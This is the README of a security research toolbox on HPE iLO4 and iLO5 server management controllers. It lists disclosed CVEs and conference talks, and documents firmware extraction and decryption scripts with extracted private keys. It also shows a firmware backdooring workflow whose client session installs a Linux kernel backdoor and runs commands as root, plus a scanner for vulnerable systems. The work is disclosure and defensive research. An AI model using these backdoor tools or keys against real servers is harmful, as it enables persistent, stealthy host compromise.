Subverting your server through its BMC: the HPE iLO4 case
=========================================================


Introduction
------------

``iLO`` is the server management solution embedded in almost every ``HPE``
servers for more than 10 years. It provides every feature required by a system
administrator to remotely manage a server without having to reach it
physically. Such features include power management, remote system console,
remote CD/DVD image mounting, as well as many monitoring indicators.

We've performed a deep dive security study of ``HPE iLO4`` (known to be used on
the family of servers ``HPE ProLiant Gen8`` and ``ProLiant Gen9`` servers) and
the results of this study were presented at the **REcon** conference held in
Brussels (February 2 - 4, 2018, see [1]_).

A follow-up of our study was presented at the **SSTIC** conference, held in
France (Rennes, June 13 - 15, 2018, see [8]_). We focused this talk on
firmware backdooring and achieving long-term persistence.

In November 2018, we presented our latest research on ``HPE iLO4`` and
``iLO5`` at **ZeroNights** conference, held in Saint-Petersburg, Russia
(November 20 - 21, 2018, see [11]_). This talk was focused on the attack
surface exposed to the host operating system and on the new secure boot
feature (silicon root of trust) introduced with ``iLO5``.

``iLO4`` runs on a dedicated ``ARM`` processor embedded in the server,
and is totally independent from the main processor. It has a dedicated flash
chip to hold its firmware, a dedicated RAM chip and a dedicated network
interface. On the software side, the operating system is the proprietary RTOS
GreenHills Integrity [2]_.


Results
-------

One critical vulnerability was identified and reported to the ``HPE PSRT`` in
February 2017, known as ``CVE-2017-12542`` (``CVSSv3`` base score 9.8 [3]_) :

* Authentication bypass and remote code execution
* Fixed in ``iLO4`` versions ``2.53`` (released in May 2017, buggy) and ``2.54`` [4]_


A second critical vulnerability was identified in  ``iLO4`` and  ``iLO5`` . It
was reported to the ``HPE PSRT`` in April 2018 and is known as
``CVE-2018-7078`` (``CVSSv3`` base score 7.2 [9]_, ``HPE`` Security Bulletin
``HPESBHF03844`` [10]_) :

* Remote or local code execution
* Fixed in ``iLO4`` version ``2.60`` (released in May 2018)
* Fixed in ``iLO5`` version ``1.30`` (released in June 2018)


A critical vulnerability was identified in the implementation of the
secure boot feature of ``iLO5``. It was reported to the ``HPE PSRT`` in
September 2018 and is known as ``CVE-2018-7113`` (``CVSSv3`` base score 6.4 [12]_,
``HPE`` Security Bulletin ``HPESBHF03894`` [13]_):

* Local Bypass of Security Restrictions
* Fixed in ``iLO5`` version ``1.37`` (released in October 2018)


Finally another critical vulnerability allowing host to iLO arbitrary code
execution was reported to ``HPE`` in Feb 2021 and is known as
``CVE-2021-29202`` (``CVSSv3`` base score 6.4, ``HPE`` Security Bulletins
``HPESBHF04121`` [19]_ and ``HPESBHF04133`` [20]_). It impacts ``iLO4`` and
``iLO5``.


Slides and demos
----------------

REcon Brussels 2018
*******************

The slides from our **REcon** talk are available here_ . They cover the
following points:

* Firmware unpacking and memory space understanding
* GreenHills OS Integrity internals:

    * kernel object model
    * virtual memory
    * process isolation

* Review of exposed attack surface: ``www``, ``ssh``, *etc.*
* Vulnerability discovery and exploitation
* Demonstration of a new exploitation technique that allows to
  compromise the host server operating system through DMA.


To illustrate them, we also release the three demos as videos. The first one
demonstrates the use of the vulnerability we discovered to bypass the
authentication from the RedFish API:


.. image:: https://github.com/airbus-seclab/ilo4_toolbox/blob/master/demos/demo1_connection_bypass.gif
    :width: 100%
    :align: center

In the second one we show how the vulnerability can also be turned into an
arbitrary remote code execution (``RCE``) in the process of the web server;
allowing read access to the ``iLO`` file-system for example.


.. image:: https://github.com/airbus-seclab/ilo4_toolbox/blob/master/demos/demo2_dump_users.gif
    :width: 100%
    :align: center

Finally, in  the third videos, we leverage this ``RCE`` to exploit an ``iLO4``
feature which allows us to access (``RW``) to the host memory and inject a
payload in the host Linux kernel.


.. image:: https://github.com/airbus-seclab/ilo4_toolbox/blob/master/demos/demo3_host_pwn.gif
    :width: 100%
    :align: center


SSTIC 2018
**********

The slides from our **SSTIC** talk are available at this location_ (more
details can be found in the paper_). After a brief recap of our **REcon**
talk, we propose the following new materials:

* Firmware security and boot chain analysis
* Backdoor architecture

To illustrate these works, we release a new demo as video. It demonstrates
the use of the vulnerability we discovered in the web server to flash a new
backdoored firmware. Then we demonstrate the use of the DMA communication
channel to execute arbitrary commands on the host system.

.. image:: https://github.com/airbus-seclab/ilo4_toolbox/blob/master/demos/demo4_backdoor.gif
    :width: 100%
    :align: center


ZeroNights 2018
***************

The material we presented at **ZeroNights** is available from there_. It
contains two major contributions.

First, an analysis of the communication channel between the host system and
the ``iLO`` (``4`` or ``5``), known as ``CHIF`` channel interface. It opens a
new attack surface,  exposed to the host (even though ``iLO`` is set as
disabled). We demonstrated that the exploitation of ``CVE-2018-7078`` could
allow us to flash a backdoored firmware from the host through this interface.

Then, an in-depth review of the new secure boot feature introduced with
``iLO5`` and ``HPE Gen10`` server line. It covers the complete bootchain, from
the ``iLO ASIC`` (silicon root of trust) down to the ``Integrity`` kernel and
userland images. We discovered a logic error (``CVE-2018-7113``) in the kernel
code responsible for the integrity verification of the userland image, which
can be exploited to break the chain-of-trust.

To illustrate this defeat of the secure boot feature, we propose the new video
below. It demonstrates the exploitation of the logic error to update the
``iLO5`` firmware with a compromised firmware embedding a backdoored userland
image in which the banner of the ``SSH`` server has been altered.


.. image:: https://github.com/airbus-seclab/ilo4_toolbox/blob/master/demos/demo5_secure_boot.gif
    :width: 100%
    :align: center


A proof of concept implementing the secure boot bypass alone is available in
``ilo5_PoC_secure_boot_bypass.py``. The ``fum`` vulnerability and ``HP Signed File``
signature bypass is demonstrated in ``ilo5_PoC_fum_sig_bypass.py``.



Insomni’Hack 2019
*****************

The slides from our talk at **Insomni’Hack**, available from this link_,
intend to wrap-up most of our work on the ``iLO 4`` and  ``5`` systems.

A brief analysis of the anti-downgrade feature is introduced, as well as a
teaser on the whitepaper_ we published in collaboration with Adrien Guinet
(from Quarkslab) on *How to defeat NotPetya from your iLO4*.



SSTIC 2021
**********

In this new iteration of our work, presented at SSTIC (paper [17]_ and slides
[18]_), we propose an extensive analysis of the new firmware encryption
mechanism introduced with HPE iLO5 firmware versions 2.x. The new boot chain,
as well as the cryptographic co-processor this feature relies upon are
presented, as well as our attack to extract the encryption keys from the
system-on-chip(SOC).






Related works
-------------

A critical vulnerability was identified by Nicolas Iooss from The French
National Cybersecurity Agency (ANSSI) in the ``SSH`` service of ``iLO3``,
``iLO4`` and  ``iLO5`` . It was reported to the ``HPE PSRT`` in April 2018 and
is known as ``CVE-2018-7105`` (``CVSSv3`` base score 7.2 [14]_, ``HPE``
Security Bulletin ``HPESBHF03866`` [15]_) :

* Remote execution of arbitrary code, local disclosure of sensitive information
* Fixed in ``iLO3`` version ``1.90`` (released in August 2018)
* Fixed in ``iLO4`` version ``2.61`` (released in September 2018)
* Fixed in ``iLO5`` version ``1.35`` (released in August 2018)

Thank you Nicolas for sharing test and exploitation scripts for this issue.

Using this vulnerability it is also possible to play with ``PCILeech`` on
``HP iLO4`` without the need for a modified firmware. Although very slow for
a big memory dump, it works very well when targeting specific memory location, as
done by the Windows KMD load in ``PCILeech``. See the ``PCILeech HP iLO4
Service`` repository [16]_.


Tooling
-------

To support our research we've developed scripts and tools to help us
automatize some tasks, especially firmware unpacking and mapping.


Firmware
********

``ilo4_extract.py`` script takes an ``HP Signed file`` as input (obtained from
the update package). It is invoked with:

::

    >python ilo4_extract.py ilo4_244.bin extract


Extract from the output log:

::

    [+] iLO Header 0: iLO4 v 2.44.7 19-Jul-2016
      > magic              : iLO4
      > build_version      :  v 2.44.7 19-Jul-2016
      > type               : 0x08
      > compression_type   : 0x1000
      > field_24           : 0xaf8
      > field_28           : 0x105f57
      > decompressed_size  : 0x16802e0
      > raw_size           : 0xd0ead3
      > load_address       : 0xffffffff
      > field_38           : 0x0
      > field_3C           : 0xffffffff
      > signature


From the extracted file, ``ilo0.bin`` is the ``Integrity`` applicative image
(userland). It contains all the tasks that will run on the ``iLO`` system. To
parse each of these tasks and generate the ``IDA Pro`` loading script, one can
use the script ``dissection.rb``.

It relies upon the ``Metasm`` framework [5]_ and also requires the ``Bindata``
library [6]_.

::

    >ruby dissection.rb ilo0.bin


Back to the kernel image, ``ilo4_extract.py`` told us that:

::

    [+] iLO Header 1: iLO4 v 0.8.36 16-Nov-2015
      > magic              : iLO4
      > build_version      :  v 0.8.36 16-Nov-2015
      > type               : 0x02
      > compression_type   : 0x1000
      > field_24           : 0x9fd
      > field_28           : 0x100344
      > decompressed_size  : 0xc0438
      > raw_size           : 0x75dad
      > load_address       : 0x20001000
      > field_38           : 0x0
      > field_3C           : 0xffffffff

Using ``IDA Pro`` to load the extracted file ``ilo1.bin`` at ``0x20001000`` as
``ARM`` code, one can also study the ``Integrity`` kernel.


* ``secinfo4.py`` parses the section information embedded into the kernel image
  and creates the appropriate memory segment in the disassembler
* ``parse_mr.py`` dumps the registered ``Memory Region`` objects


``iLO5`` format differs slightly but is supported as well. ``ilo5_extract.py``
and  ``dissection.rb`` scripts can be used in the same way as for ``iLO4`` to
extract the ``Integrity`` applicative image.


Firmware encryption
*******************

Starting with ``iLO5`` verions ``2.x``, newer firmware are encrypted. The
external enveloppe can be removed using the script ``ilo5_fw_decrypt.py``.

::

    >python ilo5_fw_decrypt.py --infile ilo5_235.bin
    [+] input file: "ilo5_235.bin"
    [+] skipping HP Signed File fingerprint (2088 bytes)
    [+] loading RSA pem ("rsa_private_key_ilo5.asc")
    > key size: 4096
    [+] aes key material
    > aes key: c2447180a96f6ec4b23ed5539a63548118573ccfb9866f5cacf8f13c42c5acbe
    > aes iv: d13dcf4b12248561479488ad
    --

    [+] decrypting
    > ok
    [+] writing output file "ilo5_235.clear.bin":

               ┌───────────────  firmware header  ───────────────┬──────────────────┐
    0x00000000 │ 6e 65 62 61 39 20 30 2e 31 30 2e 31 33 00 00 00 │ neba9 0.10.13... │
    0x00000010 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x00000020 │ 1a 41 dd 4e 02 00 00 00 05 00 01 00 04 00 00 00 │ .A.N............ │
    0x00000030 │ 00 00 00 00 00 00 00 00 50 8f 61 6b 00 00 00 00 │ ........P.ak.... │
    0x00000040 │ 44 56 00 00 fe 10 5e d7 44 56 00 00 44 56 00 00 │ DV....^.DV..DV.. │
    0x00000050 │ ff ff ff ff 00 00 00 00 02 00 00 00 2b 04 f2 81 │ ............+... │
    0x00000060 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x00000070 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x00000080 │ 43 6f 70 79 72 69 67 68 74 20 32 30 31 39 20 48 │ Copyright 2019 H │
    0x00000090 │ 65 77 6c 65 74 74 20 50 61 63 6b 61 72 64 20 45 │ ewlett Packard E │
    0x000000a0 │ 6e 74 65 72 70 72 69 73 65 20 44 65 76 65 6c 6f │ nterprise Develo │
    0x000000b0 │ 70 6d 65 6e 74 2c 20 4c 50 00 00 00 00 00 00 00 │ pment, LP....... │
    0x000000c0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x000000d0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x000000e0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x000000f0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
               └─────────────────────────────────────────────────┴──────────────────┘
    [!] done captain


One can then proceed to the extraction of the various firmware components
using ``ilo5_extract.py``. The main userland image is also encrypted.
Depending on the version, different private keys are used. The script
``ilo5_image_decrypt.py`` comes with some private keys extracted for versions
``2.3x`` and ``2.41``.


::

    >python ilo5_image_decrypt.py --rawfile elf_secure_241.raw --hdrfile elf_secure_241.hdr
    [+] loading header file elf_secure_241.raw
    > version string: 2.41
    [+] loading elf_secure_241.raw
    [+] ec pub key
    > pub.pointQ.x: 0x484ed202be9af305af716e7eef2d8b00c6ceba7337ed980a4af96079d06e4b810c15451ba82b9ff10cd830b30376ee39
    > pub.pointQ.y: 0x9dd95b116424f44b0e23776e3ed85fa46b76b4922047f993f450ec89134bb7ea0770eaf851b04fa0e074e813ece4df4d
    --
    [+] ec priv key
    > priv.pointQ.x: 0xcf1093db93ad3bb9bb7050e88f417e7b054c37b02b01120318cd88faf5e3b957fa6fa15f64c7cd6d84bdd4e88cac6ea8
    > priv.pointQ.y: 0xb1f8f0bd675d05e7e0463823f2f30e2d85f3b75302af65e892451236baff9e15b76a3be2f5d39c37b08f6c65ee14203c
    > priv.d: 0xffa8193746dd557afe519993d8c18de66556675d840970265bfa9ba870a2cd84ff2a45d656240631cf91bdbf767c6beb
    --

    [+] shared secret:
    6c20dad5c5751a8ce7b6e012c3fbd5198c142edb9a52bf203a3102d783cbc8c7dd28bcac5739b62922b36e928daae51c
    --

    [+] aes key material
    > aes key: f16f2fa26032cc4de5c9c74d889981b54759f40add797329befaae36067878ea548a6f6a7edae2aae8f877054cfa54c0
    > aes iv: cf12bc3b76d5a386c9f74332
    --

    [+] decrypting
    > ok
               ┌───────────────  firmware header  ───────────────┬──────────────────┐
    0x00000000 │ 32 2e 34 31 2e 30 32 00 00 00 00 00 00 00 00 00 │ 2.41.02......... │
    0x00000010 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x00000020 │ 1a 41 dd 4e 02 00 00 00 00 00 21 00 05 00 00 00 │ .A.N......!..... │
    0x00000030 │ 01 00 00 00 00 00 00 00 b5 11 00 00 00 00 00 00 │ ................ │
    0x00000040 │ 05 60 ff 00 24 e0 44 c7 05 60 ff 00 88 ec e8 01 │ .`..$.D..`...... │
    0x00000050 │ ff ff ff ff 00 00 00 00 01 00 00 00 17 a6 e3 b6 │ ................ │
    0x00000060 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x00000070 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x00000080 │ 43 6f 70 79 72 69 67 68 74 20 32 30 32 31 20 48 │ Copyright 2021 H │
    0x00000090 │ 65 77 6c 65 74 74 20 50 61 63 6b 61 72 64 20 45 │ ewlett Packard E │
    0x000000a0 │ 6e 74 65 72 70 72 69 73 65 20 44 65 76 65 6c 6f │ nterprise Develo │
    0x000000b0 │ 70 6d 65 6e 74 2c 20 4c 50 00 00 00 00 00 00 00 │ pment, LP....... │
    0x000000c0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x000000d0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x000000e0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
    0x000000f0 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................ │
               └─────────────────────────────────────────────────┴──────────────────┘




Firmware backdooring
********************

The ``insert_backdoor.sh`` script can be run on a legitimate firmware file to
add a backdoor in the webserver module. The backdoor can then be used using
the ``backdoor_client.py`` script.

::

    >./insert_backdoor.sh ilo4_250.bin
    [...]
    [+] Firmware ready to be flashed

    >python backdoor_client.py 192.168.42.78
    [+] iLO Backdoor found
    [-] Linux Backdoor not detected
    [...]
    >>> ib.install_linux_backdoor()
    [*] Dumping kernel...
    [+] Dumped 1000000 bytes!
    [+] Found syscall table @0xffffffff81a001c0
    [+] Found sys_read @0xffffffff8121e510
    [+] Found call_usermodehelper @0xffffffff81098520
    [+] Found serial8250_do_pm @0xffffffff81528760
    [+] Found kthread_create_on_node @0xffffffff810a2000
    [+] Found wake_up_process @0xffffffff810ad860
    [+] Found __kmalloc @0xffffffff811f8c50
    [+] Found slow_virt_to_phys @0xffffffff8106c6a0
    [+] Found msleep @0xffffffff810f0050
    [+] Found strcat @0xffffffff8140c9c0
    [+] Found kernel_read_file_from_path @0xffffffff812236e0
    [+] Found vfree @0xffffffff811d7f90
    [+] Shellcode written
    [+] iLO Backdoor found
    [+] Linux Backdoor found
    >>> ib.cmd("/usr/bin/id")
    [+] Found shared memory page! 0xeab00000 / 0xffff8800eab00000
    uid=0(root) gid=0(root) groups=0(root)


Forensics
*********

The ``exploit_check_flash.py`` script can be run against an instance of ``HP
iLO4`` vulnerable to ``CVE-2017-12542``. Its purpose it to dump the content of
the flash and then compare its digest with a known "good" value.

::

    >python exploit_check_flash.py 192.168.42.78 250


Network
*******

Finally, to help people scan for existing vulnerable ``iLO`` systems exposed in
their own infrastructures, we release a simple ``Go`` scanner. It attempts to
fetch a special ``iLO`` page:  ``/xmldata?item=ALL``; if it exists, then it
extracts the firmware version and HP server type.


First edit the "``targets``" variable in the code and specify the internal
``IP`` ranges you want to scan.

::

   var (
        targets = []string{
                "10.0.0.0/8",
                "192.168.66.0/23",
                "172.16.133.0/24"}
   )


Then compile the code for your OS/architecture.

::

    > env GOOS=target-OS GOARCH=target-architecture go build iloscan.go


For example:

::

    > env GOOS=openbsd GOARCH=amd64 go build iloscan.go
    > ./iloscan

Then look the result in ``/tmp/iloscan.log`` (can be changed in the source):

::

    > less /tmp/iloscan.log
    192.168.66.69{{ RIMP} [{{ HSI} ProLiant DL380 G7}] [{{ MP} 1.80 ILOCZ2069K2S4       ILO583970CZ2069K2S4}]}

Alternatively, you can invoke the binary with a subnet on the command line (individual IP addresses should be specified as a /32 netmask):

::

    > ./iloscan 1.2.3.4/32
    Generated 1.2.3.4
    Fetching 1.2.3.4
    1.2.3.4 status: 200 OK
    {{ RIMP} [{{ HSI} ProLiant DL380 Gen9}] [{{ MP} 2.40 ILOCZJ641057H ILO826683CZJ641057H}]}


Authors
-------

* Fabien PERIGAUD - ``fabien [dot] perigaud [at] synacktiv [dot] com`` - ``@0xf4b``
* Alexandre GAZET - ``alexandre [dot] gazet [at] airbus [dot] com``
* Joffrey CZARNY  - ``snorky [at] insomnihack [dot] net`` - ``@\_Sn0rkY``



License
-------

The scripts and scanner are released under the [GPLv2]_.



References
----------

.. [1] https://recon.cx/2018/brussels/talks/subvert_server_bmc.html
.. [2] https://www.ghs.com/products/rtos/integrity.html
.. [3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12542
.. [4] http://h20565.www2.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us
.. [5] https://github.com/jjyg/metasm
.. [6] https://github.com/dmendel/bindata
.. [8] https://www.sstic.org/2018/presentation/backdooring_your_server_through_its_bmc_the_hpe_ilo4_case/
.. [9] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7078
.. [10] https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03844en_us
.. [11] https://2018.zeronights.ru/en/reports/turning-your-bmc-into-a-revolving-door/
.. [12] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7113
.. [13] https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03894en_us
.. [14] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7105
.. [15] https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03866en_us
.. [16] https://github.com/Synacktiv/pcileech_hpilo4_service
.. [17] https://airbus-seclab.github.io/ilo/SSTIC2021-Article-hpe_ilo_5_security_go_home_cryptoprocessor_youre_drunk-gazet_perigaud_czarny.pdf
.. [18] https://airbus-seclab.github.io/ilo/SSTIC2021-Slides-hpe_ilo_5_security_go_home_cryptoprocessor_youre_drunk-gazet_perigaud_czarny.pdf
.. [19] https://support.hpe.com/hpesc/public/docDisplay?docId=hpesbhf04121en_us
.. [20] https://support.hpe.com/hpesc/public/docDisplay?docId=hpesbhf04133en_us
.. [GPLv2] https://github.com/airbus-seclab/ilo4_toolbox/blob/master/COPYING
.. _here: https://github.com/airbus-seclab/airbus-seclab.github.io/blob/master/ilo/RECONBRX2018-Slides-Subverting_your_server_through_its_BMC_the_HPE_iLO4_case-perigaud-gazet-czarny.pdf
.. _location: https://github.com/airbus-seclab/airbus-seclab.github.io/blob/master/ilo/SSTIC2018-Slides-EN-Backdooring_your_server_through_its_BMC_the_HPE_iLO4_case-perigaud-gazet-czarny.pdf
.. _paper: https://airbus-seclab.github.io/ilo/SSTIC2018-Article-subverting_your_server_through_its_bmc_the_hpe_ilo4_case-gazet_perigaud_czarny.pdf
.. _there: https://airbus-seclab.github.io/ilo/ZERONIGHTS2018-Slides-EN-Turning_your_BMC_into_a_revolving_door-perigaud-gazet-czarny.pdf
.. _link: https://airbus-seclab.github.io/ilo/INSOMNIHACK2019-Slides-Riding_the_lightning_iLO4_5_BMC_security_wrapup-perigaud-gazet-czarny.pdf
.. _whitepaper: https://airbus-seclab.github.io/ilo/Whitepaper-Defeating_NotPetya_from_your_iLO4-guinet-perigaud-gazet-czarny.pdf

